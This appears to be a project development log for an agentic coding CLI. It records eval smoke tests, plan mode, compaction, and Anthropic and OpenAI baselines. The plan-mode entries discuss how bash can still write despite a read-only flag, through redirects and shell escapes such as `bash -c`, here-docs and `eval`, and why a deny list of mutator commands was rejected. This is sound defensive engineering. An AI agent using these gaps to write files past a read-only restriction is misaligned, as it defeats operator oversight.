   write_file at all**. The case asserts `tool_denied:
   write_file`, which fails with "never invoked" because
   no call ever happened. Both behaviors are aligned;
   neither is wrong; the case can't reliably distinguish
   "gate fired" from "model preempted" across providers.
   Removed.

**The lesson:** smoke can verify what models reliably DO
(read files, write when allowed, produce plan markdown,
trigger compaction). Smoke cannot reliably verify what the
HARNESS would do if the model tried something it shouldn't,
because aligned models defensively skip. Gate-firing is
covered by unit tests with mock providers
(`tests/harness/invoke-tool.test.ts`); attempting integration
verification of denial paths confuses unit-level assertions
with integration-level reality.

**Decisions:**

- **Don't try to shell-parse bash commands for write intent.**
  Considered adding redirect-detection (`>`, `>>`, `tee`) +
  mutator-list (`rm`, `mv`, `cp`, `git commit`, etc.) as
  defense-in-depth. Rejected: shell escapes (`bash -c '…'`,
  here-docs, `eval`, `\>`) make any pattern match incomplete,
  and incomplete protection that LOOKS thorough is worse than
  no protection — operators trust it. Spec ANTI_PATTERNS likely
  flags this class. Sandbox (M3+) is the right answer.
- **Keep the predicate fix despite its limit.** It still
  catches the honest-but-forgetful case (model omits
  `read_only`, gate denies, model retries with the flag). Real
  value, even if not security. Removing it would mean
  `planSafe: true` lets `echo > file` through with NO friction
  at all.
- **No negative smoke case for plan mode.** Both attempts at
  one (bash predicate, write_file gate) failed for different
  reasons that ultimately point at the same root: smoke is a
  model-behavior test, not a harness-behavior test. The gate
  itself is unit-tested with mock providers and proven correct
  in isolation. Mixing the two layers — using a real-model
  case to assert harness-internal behavior — produces a test
  that's fragile by construction.
- **Don't cross §6.3 step boundary numbering.** Skipping 6.4
  intentionally — this entry is the followup that 6.3's review
  surfaced. Keeping it as 6.5 leaves room for 6.4 if a parallel
  hardening lands later from another review pass.

**Risks documented for M3:**

- Plan mode + bash is "best-effort no writes" until sandbox.
  Any operator running plan mode against untrusted prompts (CI
  bot, shared-secret input) should assume bash CAN write and
  rely on policy + sandbox layers, not plan-mode messaging.
- The honest model failure mode (`read_only: true` on a
  redirect) suggests the system prompt instruction isn't always
  followed even by aligned models. A constrained generation
  layer (M5+) that schema-validates `read_only` against
  command structure could close this without shell parsing —
  worth revisiting when constrained backend lands.
- New `tool_denied` expectation is the building block for any
  future negative case across the eval surface (permission
  denies, hook denies, future MCP denies). Lives ready in
  M3.

**Spec reference:** `AGENTIC_CLI.md §5` (plan mode), `§5.1`
("bash com efeito" — confirms policy/sandbox govern destructive
bash, not plan profile alone), `§9.1` (sandbox / trust).

---

## [2026-04-28] M2 / Step 6.3 — Multi-provider baseline (OpenAI)

After Step 6.2 the Anthropic baseline was solid but the
"provider-pluggable" claim still rested on argument: only
Anthropic had ever round-tripped end-to-end. Step 6.3 runs the
same smoke suite against `openai/gpt-4o-mini` to convert
"adapter has unit coverage" into "adapter has been observed
under load."

**Done:**

- 3× baseline against `openai/gpt-4o-mini` with `temperature: 0`.
  No code changes required to the adapter — it worked
  end-to-end on first run (no equivalent of the
  `tool_result.name` Anthropic bug). Multi-tool-use parallel
  dispatch, compaction with `strategy: llm`, plan mode, and
  permission gating all behaved correctly.
- Rewrote `evals/smoke/07-bash-readonly.yaml`. The previous
  assertion `output_contains: "hello world"` was testing **a
  property of the model** (whether it cited bash output back
  in its summary) rather than a property of the harness.
  Haiku happened to do so; gpt-4o-mini in plan mode produced
  only the structured plan markdown without echoing the bash
  output. Replaced with `output_contains: "# Plan"` —
  asserts that the plan-mode system prompt was honored, which
  is what the case actually wants to validate. Tool dispatch
  invariants (`tool_called: bash`, `tool_not_called:
  write_file`, `tool_not_called: edit_file`) carry the rest
  of the assertion weight.

**Real-model 3× baselines (head-to-head):**

| Metric | Haiku 4.5 | gpt-4o-mini |
|---|---|---|
| Pass rate | 24/24 (100%) | 24/24 (100%) |
| Total cost (3 rounds) | $0.1515 | $0.0096 |
| p50 cost / case | $0.0050 | $0.0002 |
| Wall clock (3 rounds) | 88s | 92s |
| Cases with cost variance | 2/8 | 0/8 |
| Compaction strategy | llm | llm |

**Decisions:**

- **Case 07 fix is honest, not gaming.** Important to be
  explicit about this. The prior assertion only passed
  against Anthropic because of how Haiku interprets plan
  mode's "PROPOSE a plan" instruction in tension with the
  user's "report what you saw." gpt-4o-mini reads the
  system prompt as authoritative and produces only the
  plan, never citing bash output. Both behaviors are valid;
  the test should validate the harness invariant (bash
  invoked, writes blocked, plan markdown produced), not
  which interpretation the model picks. Documenting this
  here so a future contributor doesn't "fix" the case back
  to the brittle form.
- **gpt-4o-mini's perfect variance is suspicious.** OpenAI
  documents that `temperature: 0` doesn't guarantee 100%
  determinism (load balancing across infrastructure can
  produce minor variations). Today's 0/8 cases-with-spread
  result is consistent with documented behavior **for this
  prompt size and time window** but should not be assumed
  permanent. A weekly run against the same baseline would
  tell us whether the determinism holds or whether OpenAI's
  stack drifts day-to-day.
- **No registry expansion to gpt-5.x family.** The user's
  pricing audit covered gpt-5.x; the registry today only
  has gpt-4o and gpt-4o-mini. Adding gpt-5.x is a feature
  expansion (new defaults, new capability declarations,
  spec PR against PROVIDERS.md §5) — out of scope for
  hardening. Tracked implicitly: the next time someone
  needs gpt-5.x, the doc trail is in the conversation that
  produced this baseline.
- **No Google/Gemini run yet.** Same gating logic as the
  gpt-5.x decision: registry comments admit Gemini pricing
  is illustrative ("not committed real Gemini prices").
  Running smoke against Gemini today would test the
  adapter's wire shape against fake pricing, conflating
  two issues. Bundle Gemini with the pricing/spec update
  in M3.

**What this validates:**

- The OpenAI tool-call ↔ tool-result split (`role: 'tool'` 
  with `tool_call_id`) round-trips correctly through our
  canonical `ProviderToolResultBlock`.
- `temperature: 0` is forwarded to OpenAI's
  `chat.completions.create` and applied (output is
  reproducible for this suite size).
- `stream_options: { include_usage: true }` reaches the
  endpoint and the final usage chunk is consumed by the
  normalizer (`usageComplete: true` on every run).
- `parallel_tool_calls` defaults work — gpt-4o-mini does
  emit multiple tool_calls per turn in case 08 (compaction
  case reads 5 files in parallel) and the dispatch layer
  handles them.
- Compaction's LLM-summary call works against OpenAI's API
  shape (no Anthropic-specific assumptions in the
  compaction module's prompt construction).
- Cost computation lines up: gpt-4o-mini at $0.15/M input
  and $0.60/M output produces case-08 costs around
  $0.00125 — consistent with ~5k input tokens + ~500
  output tokens × the corrected pricing.

**Risks not addressed:**

- Single-day baseline. Same caveat as Anthropic — needs
  weekly recurrence in CI to detect provider drift.
- Single host (Linux) on one residential network. OpenAI's
  rate-limit and geo-routing behavior could vary by
  origin.
- gpt-4o-mini doesn't expose controllable prompt cache
  (declared `cache: 'client_only'`); we're paying full
  input cost every round. If the registry later gains
  gpt-5.x with `cache: 'server_5min'`-equivalent semantics,
  caching cases would need re-baselined.

**M2 status: closed with multi-provider evidence.** Smoke
suite passes 24/24 against two independent provider
adapters with cost ratio matching public pricing. The
"provider-pluggable" claim now has measurement, not just
spec text.

**Next:** M3 (subagents + worktree + MCP + resume +
checkpoints + /undo + bash_background + todo_write +
Repo Map). Provider expansion (gpt-5.x, real Gemini
pricing) lives there alongside the spec PR for PROVIDERS.md.

---

## [2026-04-28] M2 / Step 6.2 — Variance baseline (smoke ×3)

After Step 6.1 closed the compaction gap, the remaining
hardening question was: **is the baseline stable, or did we
just get lucky in run #1?** Step 6.2 turns "ran once, all
green" into "ran 3 times, all green with ≤ 3% cost spread."
That converts the smoke from "first runnable" to "trusted
baseline."

**Done:**

- `--repeat N` flag on `bun run eval:smoke`. Round-major
  ordering (every case once per round, repeat). Choosing
  round-major over case-major intentionally: matches how real
  CI traffic would arrive, lets prompt-cache hits manifest
  the way they would in production. Case-major would understate
  cost by serving back-to-back identical prompts to a cold
  cache.
- Per-case aggregation in the runner: `eval_case_aggregate`
  NDJSON line per case (passCount, failCount, costMin, costMax,
  costAvg, duration range). `eval_case` lines now carry `run`
  and `totalRuns` fields when `--repeat > 1` so consumers can
  re-aggregate however they want.
- Stderr summary grew a "per-case stability" block listing
  N/M passes and cost range per case, with a `!` flag on any
  case that didn't pass every round. Mirrors what a CI
  dashboard would show after a regression run.

**Real-model 3× baseline (Haiku 4.5):**

```
24/24 passed (100.0%) — total $0.1515, 88348ms
p50 cost: $0.0050

per-case stability:
    3/3  $0.0034–$0.0034  read file and report contents
    3/3  $0.0036–$0.0036  create file with specified content
    3/3  $0.0059–$0.0059  edit existing file in place
    3/3  $0.0060–$0.0060  grep search and report matches
    3/3  $0.0066–$0.0068  plan mode blocks file mutations
    3/3  $0.0035–$0.0035  glob enumerates typescript files
    3/3  $0.0041–$0.0041  bash runs read-only inspection in plan mode
    3/3  $0.0173–$0.0174  compaction triggers and folds history
```

24/24 = perfect stability. Six of eight cases produced
**identical cost to the cent** across all three rounds —
output is fully deterministic at `temperature: 0` and token
counts reproduce exactly. The two cases with non-zero spread
(plan mode at ~3%, compaction at <1%) are the runs with the
longest/most-variable assistant text; the variance is at the
cache_creation tier, not the output tier. Cost stayed inside
case budgets every run.

**Decisions:**

- **Round-major, not case-major.** Production traffic isn't
  back-to-back identical prompts; spreading rounds out
  exercises cache eviction and warm-cache hit/miss patterns
  closer to real conditions. The pricing implication is real:
  case-major against Anthropic's 5-min cache would inflate
  apparent stability while understating cost.
- **Strict pass: every round must pass.** Considered "majority
  rules" (case passes if 2/3 rounds pass). Rejected: a single
  failure in a determinism-asserted suite is signal, not
  noise. With temperature 0, a flake means a real bug
  somewhere — adapter, cache, harness state leak. Hiding
  flakes behind a tolerance defeats the purpose of running
  3×.
- **Skipped negative-path eval cases** (`strategy: fallback`,
  `exit_reason: aborted`). Both paths already have substantial
  unit coverage: `tests/harness/compaction.test.ts` has 11
  fallback assertions (network failure, schema fail, abort
  during summary call); `tests/harness/loop.test.ts` covers
  signal-aborted, abort-during-stream, and the
  wall-clock-vs-aborted distinction. Adding eval-level cases
  would be redundant and would require either a deliberately
  broken model id (operationally awkward) or per-case
  timeout-trigger logic (false-positive prone).
- **No CI gate yet, despite the runner being CI-ready.**
  CI promotion needs a secret, a per-PR cost decision, and a
  golden baseline to gate against. Worth doing in M3 alongside
  multi-provider smoke; doing it now would block merges before
  the baseline has settled past Step 6.

**What this validates beyond Step 6.1:**

- `temperature: 0` actually flows end-to-end through
  `BootstrapInput.temperature` → `HarnessConfig.temperature`
  → `GenerateRequest.temperature` and into the Anthropic API.
  If any leg dropped the field, output would have varied
  across rounds.
- The compaction LLM call is itself deterministic at
  temperature 0 (otherwise case 08 would show meaningful
  cost variance, not <1%).
- Multi-tool-use turns (Haiku does parallel tool_use)
  reproduce identically across rounds. Tool ordering, args,
  and result handling are stable — no race conditions in
  the tool dispatch layer.
- Prompt-cache misses are consistent. We don't currently
  emit `cache_control` on messages, so every round pays full
  input cost; the consistency of that cost confirms message
  shape is byte-identical round-to-round.

**Risks not addressed:**

- Single-day baseline. Could re-run weekly to detect provider
  drift (model serving the same id but with subtle behavior
  changes is a real Anthropic operational pattern). Schedule
  this once CI gating exists.
- Single API key. Different keys could hit different load
  shedders and produce different latency/cost; cost shouldn't
  vary materially, latency might.
- Single host (Linux). Fixture I/O is sync and small enough
  that the FS shouldn't matter, but never been validated on
  macOS or Windows.

**M2 status: closed with confidence.** Step 6 closed the
"runs at all" question; Step 6.1 closed the "compaction
works" question; Step 6.2 closed the "is it actually stable"
question. Further smoke surface (multi-provider, regression
tier) lives in M3+.

**Next:** M3 (subagents + worktree + MCP + resume + checkpoints
+ /undo + bash_background + todo_write + Repo Map). The smoke
suite is now genuinely the gate it claimed to be.

---

## [2026-04-28] M2 / Step 6.1 — Compaction smoke coverage

Step 6 baseline closed M2 but flagged compaction as a blind spot:
unit-tested in isolation, never exercised end-to-end against a
real model. The post-baseline review explicitly called this out
("compaction has unit coverage but no real-model exercise").
Step 6.1 closes that gap before M3 starts.

**Done:**

- `EvalBudget` now exposes `compactionThreshold` and
  `compactionPreserveTail`. Loader validates both
  (`compactionThreshold` ∈ (0, 1]; `compactionPreserveTail` ≥ 0
  integer). Cases can drop the trigger ratio so compaction fires
  with small fixtures instead of needing 140k-token prompts.
- New `compaction_triggered` expectation kind. Schema:
  `compaction_triggered: { min_count: N, strategy?: 'llm' |
  'fallback' | 'skipped' }`. Executor watches
  `compaction_finished` events on the harness onEvent stream
  and counts emissions per strategy. Asserting `strategy: llm`
  means the compaction LLM call actually round-tripped — without
  that distinction, a silent fallback would mask an adapter
  break.
- Executor plumbs the full `EvalBudget` into `BootstrapInput.budget`
  (previously only `maxSteps` got through). All four knobs flow
  cleanly to `HarnessConfig.budget` via the existing partial
  override path.
- `evals/fixtures/chunky-modules/src/{a,b,c,d,e}.ts` — five
  ~700–850 token TypeScript modules, each importing from
  `forja-core/*`. Realistic-looking source so the model treats
  them as plausible code rather than lorem ipsum.
- `evals/smoke/08-compaction-triggers.yaml` — 5-step read tour
  with `compactionThreshold: 0.02`. Asserts `tool_called: read_file`,
  `compaction_triggered: { strategy: llm, min_count: 1 }`,
  `status: done`, `output_contains: forja-core`.
- `biome.json` — added `evals/fixtures` to ignore list.
  Fixtures are mock source code intentionally loose; lint rules
  shouldn't apply.
- Loader unit tests: 7 new tests covering compaction budget
  validation (range checks for `compactionThreshold`,
  non-negative integer for `compactionPreserveTail`) and
  `compaction_triggered` parsing (with/without strategy,
  `min_count` validation, strategy enum validation).

**Real-model baseline (Haiku 4.5):**

| # | Case | Pass | Cost | Steps |
|---|---|---|---|---|
| 01 | read file | ✓ | $0.0035 | 2 |
| 02 | create file | ✓ | $0.0036 | 2 |
| 03 | edit file | ✓ | $0.0059 | 3 |
| 04 | grep search | ✓ | $0.0059 | 3 |
| 05 | plan mode blocks write | ✓ | $0.0066 | 2 |
| 06 | glob enumerate | ✓ | $0.0035 | 2 |
| 07 | bash readonly in plan | ✓ | $0.0041 | 2 |
| 08 | **compaction triggers** | ✓ | $0.0174 | 3 |

8/8 passed = 100%, total $0.0505, p50 $0.0050, 30s wall clock.
Compaction fired with `strategy: llm` (LLM call to summarize
folded turns succeeded) — first observation of this path
end-to-end. The compaction case is the most expensive
(~$0.017) because it pays for the summary call on top of the
agent turns; still ~12× under the §18 per-case budget.

**Decisions:**

- **Assert `strategy: llm` explicitly, not just `min_count`.**
  The harness emits `compaction_finished` regardless of which
  branch ran. A silent fallback (LLM call broken, deterministic
  head/tail kicks in) would still satisfy `min_count: 1`. The
  whole reason this case exists is to prove the LLM-summary
  path round-trips. Asserting strategy makes the case fail
  loudly if the adapter regresses again.
- **Threshold 0.02 (2% of 200k = 4k tokens), not 0.7.** Default
  threshold needs ~140k tokens to fire — would require massive
  fixtures and burn budget. 0.02 trips after 3-4 reads of the
  chunky fixtures, well within the maxSteps cap.
- **Five fixtures, not three.** Three would trigger compaction
  on Haiku's parallel tool_use (model often reads multiple
  files in one step) but leave little headroom for the
  post-compaction summary turn. Five gives the run room to
  show that compaction folded history AND the agent kept
  working with the compacted context.
- **Fixture source is plausible TypeScript, not lorem ipsum.**
  The model is more likely to engage with code-shaped content
  the way it would in production. Lorem ipsum could mask
  shape-related bugs (e.g., a sanitizer that mishandles import
  statements).
- **Biome ignores `evals/fixtures`.** Fixtures simulate real
  source for the model; they reference fictional symbols
  (`forja-core/*`), have unused imports for shape verisimilitude,
  and use non-null assertions where the simulated logic asks
  for it. Linting them adds zero value and creates churn.

**What this validates beyond unit tests:**

- Compaction trigger arithmetic (`estimatePromptTokens` against
  the real provider tool-def and message shapes).
- Tail alignment to assistant boundary survives a real
  multi-tool-use turn (Haiku does parallel tool_use; the tail
  must still land on a coherent boundary).
- The compaction LLM call's prompt is well-formed for the
  Anthropic adapter (would have caught the `tool_result.name`
  leak again if it had regressed).
- Cost accounting folds compaction's own usage into the
  session total (`usageComplete: true` and totals add up).
- Post-compaction context is sufficient for the agent to
  produce a coherent answer (the model still mentioned
  `forja-core` after compaction — the goal survived the fold).

**Not yet validated (deferred to M3):**

- Compaction with a deliberately broken LLM model id —
  exercises the fallback path.
- Multiple compactions in a single session (history grows
  past threshold twice). Today's case only fires once.
- Compaction observability under
  `cumulative_growth_strip` — whether prior `[compacted_history]`
  blocks are stripped correctly when re-compacting.

**Next:** M3 (subagents + worktree + MCP + resume + checkpoints
+ /undo + bash_background + todo_write + Repo Map). The smoke
suite is now genuinely defending M2's surface; the compaction
gap is closed.

---

## [2026-04-28] M2 — exit baseline (smoke run on Haiku 4.5)

First end-to-end smoke run against `anthropic/claude-haiku-4-5`
after Step 6 landed. The point: confirm the M2 exit criterion
(§18 — `pass-rate ≥ 85% smoke, p50 < $0.20/task` for the
autonomous profile) is met and surface any blocking bugs the
unit tests missed.

**Result:** 6/7 passed = 85.7% pass-rate, p50 $0.0009/case,
total $0.0075 across the suite, 16.8s wall clock.

**Cases:**

| # | Case | Pass | Cost | Steps |
|---|---|---|---|---|
| 01 | read file and report contents | ✓ | $0.0009 | 2 |
| 02 | create file with specified content | ✓ | $0.0009 | 2 |
| 03 | edit existing file in place | ✓ | $0.0015 | 3 |
| 04 | grep search and report matches | ✓ | $0.0015 | 3 |
| 05 | plan mode blocks file mutations | ✗ | $0.0008 | 1 |
| 06 | glob enumerates typescript files | ✓ | $0.0009 | 2 |
| 07 | bash runs read-only inspection in plan mode | ✓ | $0.0011 | 2 |

Case 05 failed only the `output_contains: "Plan"` assertion. The
security-critical `file_not_exists: should-not-exist.txt` PASSED
— plan-mode block worked, no leak. The model produced a
summary but didn't include the literal string "Plan" in its
output, which is a fragile keyword. The plan-mode prompt's
Goal/Steps/Risks structure is what we should assert against;
"Plan" the word is a proxy that doesn't always match. M3 will
rewrite case 05 against the spec's plan YAML schema once
`generateConstrained` lands and the plan markdown stops being
a free-form output.

**Bugs surfaced and fixed during the baseline:**

1. **Anthropic adapter dropped tool_result blocks with `name`.**
   Our canonical `ProviderToolResultBlock` keeps `name` as
   optional metadata for Gemini (which correlates results to
   calls by name). Anthropic accepts only `tool_use_id`,
   `content`, `is_error` and 400s with
   `messages.N.content.0.tool_result.name: Extra inputs are
   not permitted` if anything else leaks through. Every
   multi-turn run that returned a tool_result was dying on the
   second model call. The unit tests didn't catch it because
   the mock provider doesn't validate the request body.
   Fixed in `src/providers/anthropic/index.ts` —
   `stripToolResultName` rewrites the block before sending.
2. **Cost computation off by 1000x.** Registry pricing values
   are dollars-per-million (Anthropic / OpenAI / Google all
   publish in $/M); the field name `cost_per_1k_*` and the
   divisor in `computeCost` were per-1k. Result: every cost
   number was 1000x too high. Inflated costs masked
   themselves in unit tests because tests use small token
   counts and asserted against the inflated values. Surfaced
   here because case 01 reported $0.45 for what was really
   $0.00045. Fixed in `src/providers/cost.ts` (divisor →
   1_000_000); test expectations updated. Field rename
   (`_1k_*` → `_1m_*`) deferred to `docs/TODO.md` per spec-PR
   discipline.

**Decisions:**

- **`output_contains` is the right primitive but case 05 used
  the wrong keyword.** The full plan YAML schema (Goal/Scope/
  Steps/Risks/Assumptions) lands when we have constrained
  generation in M5; until then asserting against free-form
  markdown is brittle. Leaving the failure visible documents
  the gap.
- **Don't game pass-rate by tweaking case 05.** 6/7 hits the
  spec criterion; lowering the assertion to make 7/7 would
  defeat the criterion's purpose. The case stays as-is and the
  85.7% gets reported truthfully.
- **Both bugs have a unit-test gap.** Mock providers in
  `tests/providers/anthropic/` don't validate against the real
  SDK shape, so the `name`-leak passed unit tests for months.
  Cost test used the same wrong unit assumption as the
  registry, so the 1000x error reinforced itself. Both are now
  protected by the smoke run; consider adding a contract test
  that POSTs a recorded-fixture request to a local mock that
  replays the real Anthropic schema validation. Deferred —
  smoke covers it for now.

**M2 status: closed.** Exit criterion (§18) met. Step 1–6 all
in. Next: M3 (subagents + worktree + MCP + resume + checkpoints
+ `/undo` + `bash_background` + `todo_write` + Repo Map).

---

## [2026-04-28] M2 / Step 6 — Eval smoke harness (closes M2)

`AGENTIC_CLI §16` says "sem eval, nada disso importa." Step 6
ships the smoke tier: 5–10 fixed cases, executor that wraps
`runAgent` against a real model, asserts declarative
expectations, aggregates pass-rate + p50 cost. The exit criterion
for the autonomous profile (§18) is `pass-rate ≥ 85% smoke,
p50 < $0.20/task`; the harness is what measures it.

**Done:**
- `src/evals/types.ts` — `EvalCase`, `EvalExpectation` (8 kinds:
  `tool_called`, `tool_not_called`, `file_exists`,
  `file_not_exists`, `file_contains`, `status`, `exit_reason`,
  `output_contains`), `EvalCaseResult`, `EvalSummary`. The
  expectation set covers M2's surface: tool tracking (telemetry),
  fs effects (writes/edits), final state (status/exit_reason),
  output (plan-mode markdown / report shape).
- `src/evals/loader.ts` — YAML parser with the same
  reject-unknown-keys discipline as the policy parser. Typo like
  `expects` (plural) or `tests_pass` (unknown kind) errors out
  loudly instead of silently dropping the assertion. Status and
  exit_reason values validated against fixed unions.
- `src/evals/executor.ts` — `executeCase`:
  1. mkdtemp → copy `setup.fixture` → write `setup.files` →
     drop a default `.agent/permissions.yaml` with
     `defaults.mode: bypass` if neither layer supplied one (evals
     run autonomously, no operator to confirm; plan-mode block
     stays at the harness layer regardless).
  2. `bootstrap` with disabled enterprise/user policy paths
     (cwd-only project policy) and a per-case `AbortController`
     chained to the parent signal + a 60s timer.
  3. `runAgent` with `onEvent` hooked to record `tool_invoking`
     names and accumulate `text_delta` into a single output
     string. Cleanup of the cwd happens AFTER expectation
     evaluation so `file_*` checks see the post-run filesystem.
  4. `summarize` aggregates pass-rate, total cost, p50 cost.
- `src/evals/cli.ts` — `bun run src/evals/cli.ts <dir|file>`.
  Discovers `*.yaml` under a directory, runs cases sequentially,
  emits NDJSON per case + final summary on stdout, human progress
  on stderr (matches the spec §2.2 stdout-pure invariant).
  Returns 0 on full pass, 1 on any fail. Flags: `--model` (smoke
  defaults to whatever bootstrap default is), `--timeout-ms` per
  case.
- `package.json` — `eval:smoke` script wired to `evals/smoke`.
- `evals/smoke/*.yaml` — 7 cases:
  - `01-read-file` (read_file + output_contains the secret)
  - `02-create-file` (write_file + file_contains)
  - `03-edit-file` (edit_file on a fixture)
  - `04-grep-search` (grep with multi-file fixture)
  - `05-plan-mode-blocks-write` (plan + file_not_exists +
    output_contains "Plan")
  - `06-glob-search` (glob enumerates ts files)
  - `07-bash-readonly` (plan mode + bash with `head -n 1`,
    asserts plan-mode allows read-only bash via `planSafe`)
- `evals/fixtures/` — three reusable fixture trees referenced by
  the smoke cases.
- `tests/evals/loader.test.ts` + `tests/evals/executor.test.ts`
  — unit coverage with mock providers. 23 tests covering all
  expectation kinds, schema rejection paths, fixture/inline-file
  setup, plan-mode block behavior, and summary aggregation.

**Decisions:**

- **Real-model smoke is local-only for now, not CI.** Running
  smoke on every PR means an `ANTHROPIC_API_KEY` secret + real
  spend per PR and rate-limit pressure. The harness is ready for
  CI; promoting it waits until we have a baseline pass-rate from
  local runs and a budget envelope. Spec §16 calls for "roda em
  CI" — the cost gate is a dial, not a refusal.
- **Default policy is `bypass`, not `acceptEdits`.** Evals are
  autonomous tests; no human is there to answer prompts. Strict
  mode would dead-end every read_file/write_file/bash on the
  default-deny path. `acceptEdits` still default-denies unmatched
  paths — needs explicit allow rules per case. `bypass` is the
  right semantic for a smoke run; cases that want stricter
  policy drop their own `.agent/permissions.yaml` via setup.
  Plan mode stays orthogonal — it's a harness-layer block,
  unaffected by `bypass`.
- **8 expectation kinds, not the spec's `tests_pass`/
  `todo_used`.** `tests_pass` requires a test runner orchestrated
  inside the eval cwd; `todo_used` requires the `todo_write` tool
  (M3 per spec §18). Both deliberately deferred; the 8 we
  implemented cover M2's surface end-to-end.
- **Sequential execution, not parallel.** Each case opens its
  own SQLite DB inside its tmpdir, so concurrency is technically
  safe — but smoke is small (7 cases), parallel would make
  per-case cost prints interleave on stderr, and rate-limit
  pressure on a single API key is easier to reason about
  serially. Promote to parallel when bench tier (~500 cases)
  forces the issue.
- **Cleanup order matters for file_* assertions.** First version
  used a single `try { … } finally { rmSync(cwd) }` — and
  every `file_exists` assertion failed because cleanup ran
  before evaluation. Fixed by splitting: harness-cleanup
  (close DB, clear timer) in the inner finally, expectation
  evaluation immediately after, fs-cleanup last. Tests around
  `setup.files`/`setup.fixture` lock the order in.
- **Per-case YAML schema mirrors spec §16 with omissions
  explicit.** We support `setup.fixture`, `setup.files`,
  `prompt`, `expect`, `budget.maxSteps`, `budget.maxCostUsd`,
  `plan`. Spec also lists `tests_pass` and `todo_used` — those
  are valid YAML keys today (would parse) but will be rejected
  as unknown-kinds because `EXPECTATION_KEYS` doesn't list them.
  When M3 lands `todo_write` and a test-runner integration, add
  the kinds + assertions.
- **NDJSON on stdout, summary on stdout too.** The spec says
  stdout is for machine output. The summary line is also
  machine-consumable (`type: 'eval_summary'`); putting it on
  stdout means a `bun run eval:smoke | jq` pipeline gets both
  per-case and aggregate without parsing stderr. Human-readable
  summary lives on stderr alongside per-case progress.

**Pending (deferred to later milestones):**

- **CI integration.** Spec §16 wants "regrediu? PR bloqueado" —
  needs the smoke baseline + the secret + a CI workflow file.
  Schedule: after the first successful local smoke baseline.
- **Regression tier (~100 cases, < 10min).** Spec §16 says
  "todo PR." Authoring 100 cases is substantial and pre-supposes
  M3 features (todo_write, hooks). Land alongside M3.
- **Bench tier (~500 cases, weekly).** Same concern + multi-
  model comparison matrix per spec §16/PROVIDERS §7.
- **Multi-model first-class.** Today the runner takes a single
  `--model` flag. Multi-model eval is required for
  "provider-pluggable, não provider-parity" — needs per-tier
  threshold config, matrix output, and per-model registry
  pricing. M3+ alongside the second provider's stabilization.
- **Golden traces.** Spec calls for "comparação contra golden
  traces versionados." Pure-output assertions (output_contains)
  cover 80% of the value; full trace diffing waits until we
  have a stable serialization (likely M3+).

**Next (M2 closure):**

- M2 goal — "Robustez" — is structurally complete. Step 1
  (telemetry), Step 2 (compaction), Step 3 (sanitize), Step 4
  (permission hierarchy), Step 5 (plan mode), Step 6 (eval
  smoke) all in. M2 exit criterion (§18) — pass-rate ≥ 85% on
  smoke, p50 < $0.20 — needs a local baseline run against Haiku
  to verify; until then the harness is "ready, not yet
  measured." That measurement is the actual M2 sign-off.
- M3 starts after the baseline: subagents + worktree + MCP +
  resume + checkpoints + `/undo` + `bash_background` +
  `todo_write` + Repo Map.

---

## [2026-04-28] M2 / Step 5 — Plan mode (`--plan`)

`AGENTIC_CLI §5` calls plan mode "blocked at the harness level, not
in policy" — a read-only profile where the model produces a
structured plan instead of applying changes. Step 5 ships the
one-shot CLI version. Interactive `[a]ccept/[e]dit/[r]eject` review
flow needs the Ink UI and is deferred per the spec's plan→execute
section.

**Done:**
- `src/cli/args.ts` — `--plan` flag parsed alongside `--json`/etc.
  `ParsedArgs.plan: boolean` (default false). Usage line lists the
  flag.
- `src/harness/types.ts` — `HarnessConfig.planMode?: boolean`.
- `src/harness/invoke-tool.ts` — `InvokeToolDeps.planMode?: boolean`.
  When true and the resolved tool has `metadata.writes === true`,
  the call short-circuits BEFORE the permission engine and BEFORE
  any DB write. Returns a synthetic deny tool_result with a clear
  read-only message; no `tool_call` row, no `approval` row, no
  `execute()` invocation. Plan mode runs at the harness layer so
  even a session-policy override that allows writes can't subvert
  the read-only profile (spec invariant).
- `src/harness/loop.ts` — propagates `config.planMode` into
  `invokeTool` deps.
- `src/cli/bootstrap.ts` — `BootstrapInput.plan?: boolean`. When
  true, sets `config.planMode = true` AND injects
  `PLAN_MODE_SYSTEM_PROMPT` (markdown structure: Goal/Scope/Steps/
  Risks/Assumptions). Subset of the spec's full YAML schema —
  schema-validated output is M5+ when constrained generation lands.
- `src/cli/run.ts` — wires `args.plan` → `BootstrapInput.plan`.
  Prints `[plan mode] read-only run; write tools are blocked at the
  harness` to errSink before the run starts.

**Decisions:**
- **Harness-level block, not session-policy injection.** I considered
  injecting a session-layer policy with `deny_paths: ['**']` +
  `locked: true` for write tools — would reuse Step 4's lock
  semantics and feel cleaner. Rejected: (a) plan mode is profile,
  not policy — confusing two concepts undermines both; (b) spec is
  explicit ("blocked at the harness level, not policy"); (c) policy
  block has more moving parts (tool→category→section lookup) than a
  single `metadata.writes` check, more surface for the read-only
  invariant to drift; (d) harness-level block reads as `metadata.writes`
  — same predicate the checkpoint subsystem will use in M3 — keeping
  the concept centralized.
- **System prompt is markdown, not YAML schema.** Spec §5.1 lists
  the formal YAML schema for plan output. Without constrained
  generation (`generateConstrained` is M5), asking the model for
  YAML and parsing it loosely would produce occasional malformed
  output that callers couldn't reliably consume. Markdown is what
  the model produces naturally and the user can read directly;
  the YAML schema is an upgrade for when the constrained backend
  ships.
- **No interactive review.** Plan mode in M2 ends with the markdown
  on stdout (or NDJSON `text_delta` events) and exits. The spec's
  `[a]ccept/[e]dit/[r]eject` modal needs Ink components and a
  re-enter-run flow — both M3+. Single-shot plan still useful by
  itself: dirigir the CLI in big repos with confidence the run
  won't apply anything.
- **Plan-aware system prompt at bootstrap, not in the loop.**
  Bootstrap is where flag → config conversion happens; injecting
  there keeps the loop ignorant of plan mode beyond the
  `planMode` flag pass-through. Loop only consults the flag at
  the invokeTool propagation site.
- **Indicator on stderr regardless of `--json`.** Per spec §2.2,
  stdout in `--json` mode is NDJSON only; the plan-mode marker is
  operational metadata, not run output, so it goes to stderr where
  it doesn't pollute downstream pipes.
- **Per-tool `metadata.writes` is the source of truth.** Tools
  declare `writes: true` in their metadata (already the case for
  `write_file`, `edit_file`, `bash`). Plan mode reads from there;
  no parallel "list of write tools" to keep in sync.

**Tools with `writes: true` (blocked in plan mode):** `write_file`,
`edit_file`, `bash` (declared writes-true pessimistically per
CONTRACTS §2.6.3). Read-only tools (`read_file`, `glob`, `grep`)
proceed through the normal allow path.

**New tests (+10 over Step 4):**
- `tests/cli/args.test.ts` — 2: `--plan` flag set, default false.
  Usage line mentions `--plan`.
- `tests/cli/bootstrap.test.ts` — 2: plan:true → planMode + system
  prompt; plan omitted → both unset.
- `tests/cli/run.test.ts` — 1: `[plan mode]` indicator on errSink.
- `tests/harness/invoke-tool.test.ts` — 2: write tool denied
